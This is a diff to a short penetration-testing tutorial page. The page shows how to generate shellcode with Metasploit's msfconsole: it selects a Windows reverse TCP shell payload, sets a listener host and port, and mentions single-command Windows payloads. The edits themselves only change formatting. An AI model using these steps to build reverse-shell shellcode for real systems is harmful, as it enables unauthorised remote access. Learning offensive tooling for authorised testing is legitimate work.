@@ -1,10 +1,10 @@
 # Generate shellcode
 
-An easy way to generate shellcode is by using msfvenom or msconsole. I mostly see people recommending msfvenom online, but I think msfconsole can be a bit easier to work with. 
+An easy way to generate shellcode is by using `msfvenom` or `msconsole`. I mostly see people recommending msfvenom online, but I think msfconsole can be a bit easier to work with. But of course it is the same thing, just different interfaces.
 
 ## Msfconsole
 
-In msfconsole you have the keyword **generate** that help us generate shellcode. So first we have to select a payload.
+In msfconsole you have the keyword `generate` that help us generate shellcode. So first we have to select a payload.
 
 ```
 use payload/windows/shell_reverse_tcp
@@ -17,9 +17,9 @@ set LPORT 5555
 set LHOST 192.168.0.101
 ```
 
-now we genereate the shellcode using the command **generate**.
+Now we genereate the shellcode using the command `generate`.
 
-To see the options use **generate -h**
+To see the options use `generate -h`
 
 ## Single commands in windows
 
@@ -30,6 +30,4 @@ use payload/windows/exec
 
 use payload/cmd/windows/generic
 ```
-
-
 
